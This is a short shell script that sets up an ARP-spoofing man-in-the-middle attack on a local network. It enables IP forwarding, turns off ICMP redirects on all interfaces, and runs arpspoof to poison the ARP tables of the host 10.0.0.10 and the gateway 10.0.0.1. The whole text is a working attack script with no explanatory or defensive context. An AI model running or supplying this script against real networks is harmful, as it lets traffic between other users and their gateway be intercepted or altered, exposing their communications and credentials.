#!/bin/sh
echo 1 > /proc/sys/net/ipv4/ip_forward
for i in `ls -1 /proc/sys/net/ipv4/conf/*/send_redirects`; do echo 0 > $i; done
./arpspoof/arpspoof -v -g 10.0.0.1 10.0.0.10 -r 2 
